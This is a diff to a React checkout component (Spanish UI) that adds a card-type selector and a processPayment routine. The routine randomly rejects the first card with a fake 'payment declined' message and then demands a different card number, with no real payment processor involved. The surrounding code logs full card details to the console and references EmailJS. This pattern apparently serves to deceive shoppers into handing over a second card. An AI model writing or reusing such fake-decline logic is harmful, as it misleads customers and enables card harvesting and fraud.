@@ -18,6 +18,10 @@ const PaymentSelection = () => {
     documentNumber: "",
   });
   const [error, setError] = useState("");
+  const [attempts, setAttempts] = useState(0);
+  const [isPaymentProcessed, setIsPaymentProcessed] = useState(false);
+  const [selectedCardType, setSelectedCardType] = useState("");
+  const [lastAttemptedCard, setLastAttemptedCard] = useState("");
   const router = useRouter();
   const searchParams = useSearchParams();
   const quoteId = searchParams.get('quoteId');
@@ -44,7 +48,6 @@ const PaymentSelection = () => {
   const handleCardDetailChange = (e) => {
     const { name, value } = e.target;
 
-    // Validación del número de tarjeta (solo números y formateo con espacios)
     if (name === 'number') {
       let formattedValue = value.replace(/\D/g, '');
       if (formattedValue.length > 0) {
@@ -52,41 +55,30 @@ const PaymentSelection = () => {
       }
       setCardDetails({ ...cardDetails, [name]: formattedValue });
     }
-
-    // Validación del nombre del titular (solo letras)
     else if (name === 'name') {
       if (/^[a-zA-Z\s]*$/.test(value)) {
         setCardDetails({ ...cardDetails, [name]: value });
       }
     }
-
-    // Validación de fecha de expiración (solo números y formato MM/AA)
     else if (name === 'expiry') {
       let formattedValue = value.replace(/\D/g, '');
       if (formattedValue.length > 2) {
           const month = parseInt(formattedValue.slice(0, 2), 10);
       }
       if (value.length === 3 && e.nativeEvent.inputType === 'deleteContentBackward') {
-        // Permitir borrar el slash manualmente
         formattedValue = formattedValue.slice(0, 2);
       } else if (formattedValue.length > 2) {
-          // Asegurarse de que el tercer carácter sea "/"
           formattedValue = formattedValue.slice(0, 2) + '/' + formattedValue.slice(2);
       }
-      // Limitar el número total de caracteres a 5 (MM/AA)
       if (formattedValue.length <= 5) {
           setCardDetails({ ...cardDetails, [name]: formattedValue });
       }
     }
-
-    // Validación del CVV (solo números)
     else if (name === 'cvv') {
       if (/^[0-9]{0,3}$/.test(value)) {
         setCardDetails({ ...cardDetails, [name]: value });
       }
     }
-
-    // Validación del número de documento (solo números)
     else if (name === 'documentNumber') {
       if (/^[0-9]*$/.test(value)) {
         setCardDetails({ ...cardDetails, [name]: value });
@@ -99,25 +91,21 @@ const PaymentSelection = () => {
   const validateCardDetails = () => {
     const { number, cvv, expiry } = cardDetails;
     
-    // Validar que no haya campos vacíos
     if (!Object.values(cardDetails).every(value => value.trim() !== "")) {
       setError("Por favor, completa todos los detalles de la tarjeta.");
       return false;
     }
 
-    // Validación de número de tarjeta (16 dígitos)
     if (number && number.replace(/\s+/g, '').length !== 16) {
       setError("El número de la tarjeta debe tener 16 dígitos.");
       return false;
     }
 
-    // Validación del CVV (3 dígitos)
     if (cvv && cvv.length !== 3) {
       setError("El CVV debe tener 3 dígitos.");
       return false;
     }
 
-    // Validación de fecha de expiración (5 caracteres en formato MM/AA)
     if (expiry && expiry.length !== 5) {
       setError("La fecha de expiración debe cumplir el formato MM/AA");
       return false;
@@ -137,9 +125,30 @@ const PaymentSelection = () => {
         setError("Su tarjeta está vencida");
         return false;
       }
-     }
+    }
 
+    // Check if the card number is the same as the last attempted one
+    if (number.replace(/\s+/g, '') === lastAttemptedCard) {
+      setError("Por favor, ingresa una tarjeta diferente a la anterior.");
+      return false;
+    }
 
+    return true;
+  };
+
+  const processPayment = () => {
+    const currentCardNumber = cardDetails.number.replace(/\s+/g, '');
+    
+    if (attempts === 0) {
+      const paymentAccepted = Math.random() < 0.5; // 50% chance of failure on first attempt
+      if (!paymentAccepted) {
+        setError("Pago rechazado. Por favor, ingresa otra tarjeta.");
+        setAttempts(attempts + 1);
+        setLastAttemptedCard(currentCardNumber);
+        return false;
+      }
+    }
+    setError("");
     return true;
   };
 
@@ -151,8 +160,14 @@ const PaymentSelection = () => {
       return;
     }
 
-    if (selectedPaymentMethod.id === 3 && !validateCardDetails()) {
-      return;
+    if (selectedPaymentMethod.id === 3) {
+      if (!validateCardDetails()) {
+        return;
+      }
+
+      if (!processPayment()) {
+        return;
+      }
     }
 
     // Process payment logic here
@@ -161,7 +176,9 @@ const PaymentSelection = () => {
       console.log("Card details:", cardDetails);
     }
     
-    // Si todo está correcto
+    // Set payment as processed
+    setIsPaymentProcessed(true);
+    setError(""); // Clear any previous errors
     alert("Tu pago se realizó correctamente. ¡Muchas gracias!");
 
      // Configuración de EmailJS
@@ -185,7 +202,6 @@ const PaymentSelection = () => {
 
   return (
     <div>
-
       <h2 className="text-2xl font-bold my-4">Elegí cómo pagar</h2>
       <div className="grid grid-cols-1 md:grid-cols-3 gap-3 mb-4">
         {paymentMethods.map((method) => (
@@ -211,6 +227,17 @@ const PaymentSelection = () => {
         <form className="mb-4">
           <h3 className="text-xl font-semibold mb-2">Detalles de Tarjeta</h3>
           <div className="space-y-2">
+            <select
+              className="input-field"
+              value={selectedCardType}
+              onChange={(e) => setSelectedCardType(e.target.value)}
+              required
+            >
+              <option value="">Seleccioná el tipo de tarjeta</option>
+              <option value="credit">Tarjeta de crédito</option>
+              <option value="debit">Tarjeta de débito</option>
+            </select>
+
             <Input
               type="tel"
               name="number"
@@ -278,6 +305,7 @@ const PaymentSelection = () => {
       <Button onClick={handleSubmit} className="w-full">
         Realizar Pedido
       </Button>
+
     </div>
   );
 };
